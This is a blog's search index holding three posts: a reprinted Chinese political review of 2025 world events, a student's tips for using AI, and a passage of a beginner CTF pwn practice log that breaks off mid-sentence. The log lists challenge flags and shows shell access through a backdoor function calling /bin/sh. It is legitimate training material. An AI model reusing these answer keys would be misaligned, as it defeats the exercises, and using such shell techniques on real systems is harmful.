<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2025年国际热点观察</title>
      <link href="/2026/01/30/2025%E5%B9%B4%E5%9B%BD%E9%99%85%E7%83%AD%E7%82%B9%E8%A7%82%E5%AF%9F/"/>
      <url>/2026/01/30/2025%E5%B9%B4%E5%9B%BD%E9%99%85%E7%83%AD%E7%82%B9%E8%A7%82%E5%AF%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="原文出处与整理说明"><a href="#原文出处与整理说明" class="headerlink" title="原文出处与整理说明"></a>原文出处与整理说明</h2><p><strong>原文标题</strong>：2025年国际热点观察<br><strong>文章来源</strong>：《红旗文稿》2026 / 2<br><strong>原文作者</strong>：中国现代国际关系研究院课题组<br><strong>原文发布时间</strong>：2026-01-29</p><p><strong>整理说明</strong>：<br>本文内容整理自《红旗文稿》刊发文章。为便于个人学习、阅读与长期归档，现将原文内容<strong>在不改变原意、不删减内容的前提下</strong>，转换为博客文章格式，仅对段落结构和标题层级进行整理。</p><hr><p>2025年，国际局势呈现变乱交织、动荡加剧的核心特征，“美国优先”政策持续冲击国际秩序，国际力量对比深刻调整，地缘冲突热度不减，全球和平、发展、安全、治理赤字有增无减。中国在复杂国际环境中保持战略定力，担当起推动世界多极化和国际关系民主化的中流砥柱，为动荡不安的世界注入了更多稳定性和确定性。</p><p>深入分析当前国际热点问题，对于我们深化对百年未有之大变局的认识，正确把握历史大势，在应对国际风云变幻和各种风险挑战中坚定不移办好自己的事，具有重要意义。</p><hr><h2 id="一、中国元首外交推动和平与发展事业"><a href="#一、中国元首外交推动和平与发展事业" class="headerlink" title="一、中国元首外交推动和平与发展事业"></a>一、中国元首外交推动和平与发展事业</h2><p>2025年，世界百年变局加速演进，冷战思维与单边主义阴霾不散，全球发展赤字与安全挑战交织叠加。在此关键节点，中国元首外交以远见卓识和务实行动，为动荡变革的世界注入稳定力量，为人类和平与发展事业擘画前行路径，书写了大国担当的崭新篇章。</p><p>大国关系是世界和平的“压舱石”。2025年，中国元首外交坚持对话协商，推动大国关系均衡发展。中俄元首多次会晤，引领两国关系成为世界最稳定、最成熟的大国关系，共同维护全球战略稳定与国际法权威。中美元首时隔6年再度会晤，超百分钟的深入沟通为两国关系校准航向，彰显“做伙伴、做朋友”的历史必然。</p><p>与法国总统漫步都江堰、同欧洲多国领导人深化共识，中国元首外交推动中欧发出多边主义与开放合作的共同声音。</p><p>发展是解决一切问题的总钥匙。2025年，中国元首外交聚焦周边与发展中国家，以互利合作破解发展难题。从东南亚之行推动中越、中马命运共同体建设，到中亚之旅签署《永久睦邻友好合作条约》，再到韩国之行深化战略伙伴关系，周边外交在互动中织密友谊与合作网络。</p><p>中国始终坚持大小国家一律平等，会见格林纳达等发展中国家领导人，倾听全球南方声音，推动合作成果惠及各国人民。一年来，数十场双边会晤密集开展，一系列合作共识转化为务实项目，中国元首外交让发展成果更多更公平地惠及各国人民。</p><p>2025年的中国元首外交，以理念引领方向，以对话化解分歧，以合作促进发展。在构建人类命运共同体的征程中，中国将继续通过元首外交凝聚共识、汇聚力量，与世界各国携手应对风险挑战，共同创造和平发展、互利共赢的美好未来。</p><hr><h2 id="二、美国国家战略转向加剧全球局势不稳定性"><a href="#二、美国国家战略转向加剧全球局势不稳定性" class="headerlink" title="二、美国国家战略转向加剧全球局势不稳定性"></a>二、美国国家战略转向加剧全球局势不稳定性</h2><p>2025年，美国政府激进推行“美国优先”议程，企图重振美国实力地位。</p><h3 id="（一）对内政策"><a href="#（一）对内政策" class="headerlink" title="（一）对内政策"></a>（一）对内政策</h3><p>对内，“特朗普革命”意图夯实霸权根基，授权“政府效率部”大肆整改联邦政府，大规模驱逐非法移民，力推国会通过《“大而美”法案》《天才法案》等重磅立法；采取“技术加速主义”路线，通过减少监管、加速投资，加紧布局科技竞争；能源与环境政策“猛掉头”，废除拜登政府“绿色新政”，重新拥抱化石能源，意图以强化能源主导权保障美国经济与地缘优势。</p><h3 id="（二）对外政策"><a href="#（二）对外政策" class="headerlink" title="（二）对外政策"></a>（二）对外政策</h3><p>对外，大搞“交易外交”，以单边方式服务“美国至上”。经济领域，发动历史性全球关税战，力度空前、手段激进；外交领域，一面全力遏制中国，一面肆意霸凌盟友，毫不顾忌欧洲利益与看法。</p><p>美国政府还拒绝承担国际责任，宣布退出《巴黎协定》、世卫组织等重要协定或机构，并表示将退出66个“不再服务于美国利益”的国际组织。新版《国家安全战略》强调美中“经济再平衡”和美国在西半球利益。</p><p>美国政府追求“以实力求和平”，破坏性极大，严重损害国家间互信，扰乱全球经济秩序，加剧全球安全困境。</p><hr><h2 id="三、美欧关系呈现复杂化态势"><a href="#三、美欧关系呈现复杂化态势" class="headerlink" title="三、美欧关系呈现复杂化态势"></a>三、美欧关系呈现复杂化态势</h2><p>2025年，美欧关系遭受特朗普二任的巨大冲击，双方矛盾不断加深。</p><p>在俄乌冲突中，美国与俄罗斯越过欧洲开展“越顶外交”，引发欧洲和乌克兰强烈反弹；特朗普还公开威胁“不排除用武力夺取格陵兰岛”。</p><p>在经贸领域，美国强迫欧洲接受一系列“不对等条款”，并强力施压欧盟撤销绿色和数字监管措施。新版《国家安全战略》甚至宣称欧洲将面临“文明消亡”。</p><p>安全、经济与价值观三大支柱同步松动，美欧关系正在加速分裂，裂痕公开化、激烈化趋势明显。</p><hr><h2 id="四、俄乌和平谈判核心议题分歧依旧难解"><a href="#四、俄乌和平谈判核心议题分歧依旧难解" class="headerlink" title="四、俄乌和平谈判核心议题分歧依旧难解"></a>四、俄乌和平谈判核心议题分歧依旧难解</h2><p>2025年是俄乌冲突第四个年头。双方消耗战态势持续，远程互袭日趋激烈。</p><p>特朗普政府提出28点和平计划，但在领土、安全与核电站归属等问题上分歧严重。美、欧、俄、乌各方方案分歧明显，停火条件立场对立。</p><p>由于核心诉求难以调和，俄乌和平谈判前景依旧复杂艰难。对话谈判仍是唯一可行途径。</p><hr><h2 id="五、中东战火损失惨重，未来前景堪忧"><a href="#五、中东战火损失惨重，未来前景堪忧" class="headerlink" title="五、中东战火损失惨重，未来前景堪忧"></a>五、中东战火损失惨重，未来前景堪忧</h2><p>2025年，中东安全局势持续动荡，伊朗长期经营的“抵抗阵线”遭到重创。</p><p>“12日战争”后，伊朗战略威慑力严重削弱，中东进入旧秩序瓦解、新秩序尚未成形的过渡阶段。以色列强势扩张，土耳其和海湾国家加快调整地区战略。</p><p>中东正处于新旧矛盾叠加的高风险时期，未来不确定性明显增加。</p><hr><h2 id="六、全球金融市场动荡加剧经济风险"><a href="#六、全球金融市场动荡加剧经济风险" class="headerlink" title="六、全球金融市场动荡加剧经济风险"></a>六、全球金融市场动荡加剧经济风险</h2><p>2025年，美国“关税战”与地缘政治风险叠加，全球金融市场剧烈波动。</p><p>美元信用受损，美股估值承压，全球“去美元化”趋势加速。黄金、白银价格大幅上涨，加密货币波动剧烈。</p><p>国际金融体系进入结构调整期，风险上升，多极化趋势更加明显。</p><hr><h2 id="七、人工智能发展格局调整呼吁加强国际合作"><a href="#七、人工智能发展格局调整呼吁加强国际合作" class="headerlink" title="七、人工智能发展格局调整呼吁加强国际合作"></a>七、人工智能发展格局调整呼吁加强国际合作</h2><p>2025年，中美人工智能技术差距迅速缩小。中国以 DeepSeek、昇腾等为代表的国产模型强势突围，开源模型全球影响力持续扩大。</p><p>中国人工智能以低门槛、可本地化部署等优势，推动全球人工智能普惠发展。科技进步需要开放合作，全球治理亟需协调统一。</p><hr><h2 id="八、以历史正义捍卫二战胜利成果"><a href="#八、以历史正义捍卫二战胜利成果" class="headerlink" title="八、以历史正义捍卫二战胜利成果"></a>八、以历史正义捍卫二战胜利成果</h2><p>2025年是中国人民抗日战争暨世界反法西斯战争胜利80周年，也是联合国成立80周年。</p><p>中国通过一系列重大纪念活动，弘扬正确历史观，捍卫二战胜利成果，维护以联合国为核心的国际体系。</p><p>历史不容篡改，世界不应重回“强权即公理”的丛林法则。</p><hr><h2 id="九、日本高市早苗政权挑战战后国际秩序引发国际社会高度警惕"><a href="#九、日本高市早苗政权挑战战后国际秩序引发国际社会高度警惕" class="headerlink" title="九、日本高市早苗政权挑战战后国际秩序引发国际社会高度警惕"></a>九、日本高市早苗政权挑战战后国际秩序引发国际社会高度警惕</h2><p>2025年10月，高市早苗出任日本首相后，推行扩军备武、干涉台湾问题、否认侵略历史等一系列危险举措。</p><p>其行为严重挑战战后国际秩序，破坏中日政治基础，威胁地区和平稳定，遭到国际社会广泛警惕和反对。</p><hr><h2 id="十、全球治理倡议回应时代挑战"><a href="#十、全球治理倡议回应时代挑战" class="headerlink" title="十、全球治理倡议回应时代挑战"></a>十、全球治理倡议回应时代挑战</h2><p>2025年9月1日，习近平总书记在“上海合作组织+”会议上首次提出全球治理倡议。</p><p>该倡议与全球发展、安全、文明倡议相辅相成，为改革完善全球治理体系提供中国方案。倡议一经提出即获国际社会广泛响应。</p><p>未来，中国将继续推动构建更加公正、合理、有效的全球治理体系。</p>]]></content>
      
      
      <categories>
          
          <category> 时政学习 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ai使用教程</title>
      <link href="/2026/01/30/ai%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
      <url>/2026/01/30/ai%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="一切皆可-AI：我的-AI-使用技巧与大学学习实践心得"><a href="#一切皆可-AI：我的-AI-使用技巧与大学学习实践心得" class="headerlink" title="一切皆可 AI：我的 AI 使用技巧与大学学习实践心得"></a>一切皆可 AI：我的 AI 使用技巧与大学学习实践心得</h1><blockquote><p>在很长一段时间里，我一直把 AI 当成“有问题才用的工具”。<br>后来我发现，其实换一个视角——<strong>一切皆可 AI</strong>，很多事情都会变得更轻松。</p></blockquote><p>这篇文章主要记录我在<strong>学习、做项目以及日常思考中使用 AI 的一些观念转变和实践经验</strong>，尤其是对大学阶段的同学来说，AI 不只是“写作业神器”，而是一个可以长期共处的「第二大脑」。</p><hr><h2 id="一、观念转变：从「用-AI」到「和-AI-一起想」"><a href="#一、观念转变：从「用-AI」到「和-AI-一起想」" class="headerlink" title="一、观念转变：从「用 AI」到「和 AI 一起想」"></a>一、观念转变：从「用 AI」到「和 AI 一起想」</h2><p>很多人使用 AI 的方式是这样的：</p><ul><li>作业不会 → 问 AI</li><li>报错了 → 贴给 AI</li><li>实在没思路 → 让 AI 给方案</li></ul><p>但我后来慢慢意识到一个变化：</p><blockquote><p><strong>AI 不应该只在“卡住”的时候出现，而是从一开始就参与。</strong></p></blockquote><h3 id="一切皆可-AI，意味着什么？"><a href="#一切皆可-AI，意味着什么？" class="headerlink" title="一切皆可 AI，意味着什么？"></a>一切皆可 AI，意味着什么？</h3><ul><li>有问题，不要攒着</li><li>有想法，不用等成熟</li><li>有困惑，不必先想清楚</li></ul><p>👉 <strong>第一时间丢给 AI</strong></p><p>哪怕你的问题是模糊的、零碎的、不成体系的，也完全没关系。</p><p>比如：</p><ul><li>“我感觉这门课学得很乱，但又说不清哪里有问题”</li><li>“我想做个项目，但好像什么都想做一点”</li><li>“这个知识点我好像懂了，又好像没懂”</li></ul><p>这些<strong>本来就很难自己整理的问题</strong>，反而非常适合和 AI 对话。</p><hr><h2 id="二、AI-在大学学习中的实际作用"><a href="#二、AI-在大学学习中的实际作用" class="headerlink" title="二、AI 在大学学习中的实际作用"></a>二、AI 在大学学习中的实际作用</h2><h3 id="1️⃣-学新知识：让-AI-当“私人助教”"><a href="#1️⃣-学新知识：让-AI-当“私人助教”" class="headerlink" title="1️⃣ 学新知识：让 AI 当“私人助教”"></a>1️⃣ 学新知识：让 AI 当“私人助教”</h3><p>在大学里，我们经常遇到的问题不是「学不会」，而是：</p><ul><li>不知道重点在哪</li><li>不知道该怎么开始</li><li>不知道这门课在干嘛</li></ul><p>这时可以直接对 AI 说：</p><blockquote><p>“我是一名大一 / 大二学生，现在在学 XXX，你能用通俗但不敷衍的方式帮我梳理这门课的知识结构吗？”</p></blockquote><p>你可以让 AI：</p><ul><li>用 <strong>类比</strong> 解释抽象概念</li><li>把一章内容拆成「你现在只需要懂的 20%」</li><li>对比「考试视角」和「实际应用视角」</li></ul><p>AI 很适合做<strong>第一遍理解</strong>，而不是替你记忆。</p><hr><h3 id="2️⃣-写作业-写论文：不是代写，而是“拆解任务”"><a href="#2️⃣-写作业-写论文：不是代写，而是“拆解任务”" class="headerlink" title="2️⃣ 写作业 / 写论文：不是代写，而是“拆解任务”"></a>2️⃣ 写作业 / 写论文：不是代写，而是“拆解任务”</h3><p>与其直接说「帮我写作业」，不如这样用：</p><ul><li>让 AI <strong>拆解作业要求</strong></li><li>帮你判断老师真正想考什么</li><li>给一个<strong>结构框架</strong>，而不是完整答案</li></ul><p>例如：</p><blockquote><p>“这是我的课程作业要求，你先不要给答案，只帮我分析：这道题主要考什么能力？”</p></blockquote><p>这一步能极大减少「写了半天，方向全错」的情况。</p><hr><h3 id="3️⃣-复习与总结：让-AI-帮你“压缩知识”"><a href="#3️⃣-复习与总结：让-AI-帮你“压缩知识”" class="headerlink" title="3️⃣ 复习与总结：让 AI 帮你“压缩知识”"></a>3️⃣ 复习与总结：让 AI 帮你“压缩知识”</h3><p>AI 非常擅长做三件事：</p><ul><li>总结</li><li>对比</li><li>抽象</li></ul><p>你可以把自己的笔记、PPT、甚至零散想法丢给 AI，让它帮你：</p><ul><li>总结成 <strong>考试前速览版</strong></li><li>列出 <strong>容易混淆的点</strong></li><li>用问答的方式帮你自测</li></ul><hr><h2 id="三、做项目时，我是怎么用-AI-的"><a href="#三、做项目时，我是怎么用-AI-的" class="headerlink" title="三、做项目时，我是怎么用 AI 的"></a>三、做项目时，我是怎么用 AI 的</h2><h3 id="1️⃣-有想法-→-先和-AI-讨论"><a href="#1️⃣-有想法-→-先和-AI-讨论" class="headerlink" title="1️⃣ 有想法 → 先和 AI 讨论"></a>1️⃣ 有想法 → 先和 AI 讨论</h3><p>以前我经常卡在一个阶段：</p><blockquote><p>“我有个想法，但不确定值不值得做。”</p></blockquote><p>现在我的第一反应是：</p><blockquote><p>“我有一个不成熟的想法，我直接说，你帮我判断可行性。”</p></blockquote><p>你可以让 AI 扮演不同角色：</p><ul><li>产品经理</li><li>技术负责人</li><li>普通用户</li></ul><p>从不同视角帮你<strong>打碎和重组想法</strong>。</p><hr><h3 id="2️⃣-逐步明确，而不是一次到位"><a href="#2️⃣-逐步明确，而不是一次到位" class="headerlink" title="2️⃣ 逐步明确，而不是一次到位"></a>2️⃣ 逐步明确，而不是一次到位</h3><p>和 AI 讨论项目时，我一般是这样一个流程：</p><ol><li>丢一个很模糊的想法</li><li>让 AI 帮我拆成模块</li><li>针对其中一个模块深入</li><li>确定最小可行版本（MVP）</li><li>再开始真正写代码</li></ol><p>👉 <strong>AI 非常适合陪你“慢慢想清楚”</strong></p><hr><h3 id="3️⃣-执行阶段：让-AI-成为随叫随到的搭子"><a href="#3️⃣-执行阶段：让-AI-成为随叫随到的搭子" class="headerlink" title="3️⃣ 执行阶段：让 AI 成为随叫随到的搭子"></a>3️⃣ 执行阶段：让 AI 成为随叫随到的搭子</h3><p>在真正开始做项目后，AI 可以：</p><ul><li>解释报错，而不是只给修复方案</li><li>帮你评估不同实现方式的取舍</li><li>帮你检查“这个功能是不是做复杂了”</li></ul><p>你可以随时中断思考，把当前状态发给 AI：</p><blockquote><p>“我现在做到这一步了，但感觉有点乱，你帮我理一下下一步优先级。”</p></blockquote><hr><h2 id="四、非常实用的-AI-使用技巧"><a href="#四、非常实用的-AI-使用技巧" class="headerlink" title="四、非常实用的 AI 使用技巧"></a>四、非常实用的 AI 使用技巧</h2><h3 id="✅-技巧-1：对话太长？让-AI-帮你“生成-Prompt”"><a href="#✅-技巧-1：对话太长？让-AI-帮你“生成-Prompt”" class="headerlink" title="✅ 技巧 1：对话太长？让 AI 帮你“生成 Prompt”"></a>✅ 技巧 1：对话太长？让 AI 帮你“生成 Prompt”</h3><p>这是我<strong>用得最多的技巧之一</strong>。</p><p>当对话变得很长、信息很多时，可以直接说：</p><blockquote><p>“请你总结一下我们目前的讨论，并帮我生成一个新的 prompt，用于开启下一轮对话。”</p></blockquote><p>这样你可以：</p><ul><li>清空上下文</li><li>保留核心目标</li><li>避免 AI 因为上下文过长而跑偏</li></ul><hr><h3 id="✅-技巧-2：不要等问题“想清楚”再问"><a href="#✅-技巧-2：不要等问题“想清楚”再问" class="headerlink" title="✅ 技巧 2：不要等问题“想清楚”再问"></a>✅ 技巧 2：不要等问题“想清楚”再问</h3><p>这是一个非常重要的心态转变：</p><blockquote><p><strong>问题不是想清楚了才问 AI，而是问 AI 的过程中想清楚。</strong></p></blockquote><p>哪怕你现在只知道：</p><ul><li>“我好像哪里不太对劲”</li><li>“我感觉这个方向有点怪”</li></ul><p>都可以直接说出来。</p><hr><h3 id="✅-技巧-3：把-AI-当成“会反问你的对象”"><a href="#✅-技巧-3：把-AI-当成“会反问你的对象”" class="headerlink" title="✅ 技巧 3：把 AI 当成“会反问你的对象”"></a>✅ 技巧 3：把 AI 当成“会反问你的对象”</h3><p>你可以主动要求 AI：</p><ul><li>多问你问题</li><li>挑你方案的毛病</li><li>假装不同意你的想法</li></ul><p>例如：</p><blockquote><p>“你现在站在反对者的角度，尽可能否定我的方案。”</p></blockquote><p>这对思考质量的提升非常明显。</p><hr><h2 id="五、写在最后：AI-不是替你思考，而是放大你"><a href="#五、写在最后：AI-不是替你思考，而是放大你" class="headerlink" title="五、写在最后：AI 不是替你思考，而是放大你"></a>五、写在最后：AI 不是替你思考，而是放大你</h2><p>我越来越觉得，AI 的真正价值不是：</p><ul><li>帮你少想</li><li>帮你偷懒</li></ul><p>而是：</p><blockquote><p><strong>帮你更早开始思考，更久地保持思考。</strong></p></blockquote><p>如果你愿意把 AI 当成一个长期协作的对象，而不是“救急工具”，你会发现：</p><ul><li>学习变得没那么痛苦</li><li>项目不再那么容易烂尾</li><li>自己的想法会越来越清晰</li></ul><p><strong>一切皆可 AI，但前提是——你愿意把自己也放进思考里。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-PWN暑期刷题记录</title>
      <link href="/2026/01/30/CTFshowPWN%E7%BB%83%E4%B9%A0/"/>
      <url>/2026/01/30/CTFshowPWN%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>放一波暑假的刷题记录<br>以下题目来源：ctfshow pwn入门</p><p>☁️ ✴︎📩 🩹</p><blockquote><p> Test_your_nc 01~05</p></blockquote><h2 id="01-pwn0"><a href="#01-pwn0" class="headerlink" title="01 pwn0"></a>01 pwn0</h2><p>🚩flag：<code>ctfshow{f3fb4340-bbae-4ef1-ac35-e7668329b410}</code></p><p>💡hint：<code>签到</code></p><p>题目描述：用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接</p><p><a href="https://pan.baidu.com/s/1wHPhZ7XOouFU6KgyOiSfLQ">专用虚拟机镜像，全套在这里，提取码show</a></p><p>虚拟机镜像 用户名为ctfshow 密码是ctfshow</p><img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 13.36.26.png" alt="截屏2025-08-11 13.36.26" style="zoom:50%;"><p>给了一个shell。</p><p>获取flag：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> /</span><br><span class="line"><span class="built_in">cat</span> /ctfshow_flag</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="02-pwn1"><a href="#02-pwn1" class="headerlink" title="02 pwn1"></a>02 pwn1</h2><p>🚩flag：<code>ctfshow{4dd710b0-23c0-4a5e-bcb8-909ec3aa4e81}</code></p><p>💡hint：<code>基础分析</code></p><p>使用<code>nc pwn.challenge.ctf.show 28107</code>连接上靶机，即可拿到flag。</p><p>程序直接执行了后门函数</p><hr><h2 id="03-pwn2"><a href="#03-pwn2" class="headerlink" title="03 pwn2"></a>03 pwn2</h2><p>🚩flag：<code>ctfshow{5c2dc31f-35e8-4df8-ba49-155c8529e01b}</code></p><p>💡hint：<code>基础分析</code></p><p>题目描述：给你一个shell，这次需要你自己去获得flag</p><p>环境中提示用户手动执行后门函数获得flag。</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /ctfshow_flag</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="04-pwn03"><a href="#04-pwn03" class="headerlink" title="04 pwn03"></a>04 pwn03</h2><p>🚩flag：<code>ctfshow{d0593e57-6c08-4666-b6f3-d35718fb6f59}</code></p><p>💡hint：<code>基础分析</code></p><p>题目描述：哪一个函数才能读取flag？</p><p>![截屏2025-08-11 13.49.26](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 13.49.26.png)</p><ul><li><code>system()</code> 是 Linux 系统调用，可以直接执行 shell 命令。</li><li><code>cat /ctfshow_flag</code> 会读取 <code>/ctfshow_flag</code> 文件的内容并输出到终端。</li></ul><hr><h2 id="05-pwn4"><a href="#05-pwn4" class="headerlink" title="05 pwn4"></a>05 pwn4</h2><p>🚩flag：<code>ctfshow{0b4bf2e8-ec76-480f-8ffb-453184a07ea9}</code></p><p>💡hint：<code>反编译 </code> <code>自动化路径求解</code></p><p>题目描述：或许需要先得到某个神秘字符</p><p>![截屏2025-08-11 13.53.15](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 13.53.15.png)</p><p>现在需要按照规范的流程来分析。</p><p>先checksec：</p><blockquote><p><strong><code>checksec</code></strong> 是一个用于检查二进制文件安全防护机制的工具，它能快速分析 ELF 可执行文件或共享库的安全属性，包括：</p><ul><li><strong>NX（堆栈不可执行）</strong>：防止 shellcode 在栈上运行；</li><li><strong>PIE（地址随机化）</strong>：使代码段加载地址随机化，增加漏洞利用难度；</li><li><strong>RELRO（重定位只读）</strong>：保护 GOT 表不被篡改（Full RELRO 最安全）；</li><li><strong>Canary（栈保护）</strong>：检测栈溢出攻击；</li><li><strong>Fortify</strong>：对危险函数（如 <code>strcpy</code>）进行编译时加固。<br>运行 <code>checksec --file=程序名</code> 即可查看防护状态，帮助评估漏洞利用的可行性。</li></ul></blockquote><p>![截屏2025-08-11 14.15.31](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 14.15.31.png)</p><p>可以看到是64位保护全开。</p><p>使用ida进行查看</p><p>![截屏2025-08-11 14.16.46](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 14.16.46.png)</p><p>大致流程如下：</p><p>首先将字符串 “CTFshowPWN” 复制到 s1 变量中。</p><p>接着，使用 puts 函数输出字符串 “find the secret !”。</p><p>紧接着，通过 __isoc99_scanf 函数从用户输入中读取一个字符串到 s2 变量中。</p><p>最后，通过 strcmp 函数比较 s1 和 s2 的内容是否相同。如果相同，则调用 execve_func 函 数。</p><p>跟进execve_func()：</p><p>![截屏2025-08-11 14.18.12](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 14.18.12.png)</p><p>可以看到将字符串 “/bin/sh” 赋值给  argv 变量。</p><p>然后，将 v2 和 v3 初始化为 0。</p><p>通过调用 execve 系统调用来执行 /bin/sh shell。</p><p>因此这里的execve_func也就是我们所谓的一个后门函数了</p><p>所以根据主函数，我们需要输入的字符是：</p><blockquote><p>CTFshowPWN</p></blockquote><p>然后按照常规流程来获取flag即可。</p><p>![截屏2025-08-11 14.23.39](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 14.23.39.png)</p><hr><blockquote><p>06~35为前置基础系列</p></blockquote><h2 id="06-pwn5"><a href="#06-pwn5" class="headerlink" title="06 pwn5"></a>06 pwn5</h2><p>🚩flag：<code>ctfshow{0b4bf2e8-ec76-480f-8ffb-453184a07ea9}</code></p><p>💡hint：<code>计组原理</code></p><p>题目描述：运行此文件，将得到的字符串以ctfshow{xxxxx}提交。</p><p>如：运行文件后 输出的内容为 Hello_World</p><p>提交的flag值为：ctfshow{Hello_World}</p><p>注意添加可执行权限：</p><p>![截屏2025-08-11 14.42.42](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 14.42.42.png)</p><p>添加外壳之后是ctfshow{Welcome_to_CTFshow_PWN}</p><hr><h2 id="07-pwn6"><a href="#07-pwn6" class="headerlink" title="07 pwn6"></a>07 pwn6</h2><p>🚩flag：<code>ctfshow{114514}</code></p><p>💡hint：<code>计组原理</code></p><p>题目描述：立即寻址方式结束后eax寄存器的值为？</p><p>首先执行文件，结果跟上一题一样。</p><p>![截屏2025-08-11 15.08.48](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 15.08.48.png)</p><p>我们再来看源代码。</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db "Welcome_to_CTFshow_PWN", 0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">    global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11         ; 将11赋值给eax</span><br><span class="line">    add eax, 114504     ; eax加上114504</span><br><span class="line">    sub eax, 1          ; eax减去1</span><br><span class="line"></span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx        ; 将ebx的值赋值给edx</span><br><span class="line"></span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, msg      ; 将msg的地址赋值给ecx</span><br><span class="line"></span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 输出字符串</span><br><span class="line">    mov eax, 4          ; 系统调用号4代表输出字符串</span><br><span class="line">    mov ebx, 1          ; 文件描述符1代表标准输出</span><br><span class="line">    mov ecx, msg        ; 要输出的字符串的地址</span><br><span class="line">    mov edx, 22         ; 要输出的字符串的长度</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line"></span><br><span class="line">; 退出程序</span><br><span class="line">    mov eax, 1          ; 系统调用号1代表退出程序</span><br><span class="line">    xor ebx, ebx        ; 返回值为0</span><br><span class="line">    int 0x80            ; 调用系统调用</span><br><span class="line">                                                                                                                                                                                    </span><br></pre></td></tr></tbody></table></figure><p>看懂注释，就是11+114504-1=114514</p><p>即flag：ctfshow{114514}</p><hr><h2 id="08-pwn7"><a href="#08-pwn7" class="headerlink" title="08 pwn7"></a>08 pwn7</h2><p>🚩flag：<code>ctfshow{0x36D}</code></p><p>💡hint：<code>计组原理</code></p><p>题目描述：寄存器寻址方式结束后edx寄存器的值为？</p><p>题目文件相比还是和上一个题目一样。看到上一个题目的代码：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx        ; 将ebx的值赋值给edx</span><br></pre></td></tr></tbody></table></figure><p>故flag：<code>ctfshow{0x36D}</code></p><p>内存中一般大写（？）</p><hr><h2 id="09-pwn8"><a href="#09-pwn8" class="headerlink" title="09 pwn8"></a>09 pwn8</h2><p>🚩flag：<code>ctfshow{0x80490E8}</code></p><p>💡hint：<code>计组原理</code></p><p>题目描述：直接寻址方式结束后ecx寄存器的值为？</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db "Welcome_to_CTFshow_PWN", 0</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, msg      ; 将msg的地址赋值给ecx</span><br></pre></td></tr></tbody></table></figure><p>注意这里是msg的地址，不是msg本身。</p><p>ida中查看得到：0x80490E8</p><p>相关资料：</p><h3 id="x86-汇编寻址方式详解"><a href="#x86-汇编寻址方式详解" class="headerlink" title="x86 汇编寻址方式详解"></a><strong>x86 汇编寻址方式详解</strong></h3><p>在你的代码中，展示了多种 x86 汇编寻址方式。以下是每种方式的详细说明和示例：</p><p><strong>1. 立即寻址（Immediate Addressing）</strong></p><p><strong>特点</strong>：操作数直接编码在指令中（常数）。<br>​<strong>用途</strong>​：用于赋值或算术运算。<br>​<strong>示例</strong>​：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mov eax, 11      ; eax = 11（直接赋值）</span><br><span class="line">add eax, 114504  ; eax += 114504</span><br><span class="line">sub eax, 1       ; eax -= 1</span><br></pre></td></tr></tbody></table></figure><p><strong>2. 寄存器寻址（Register 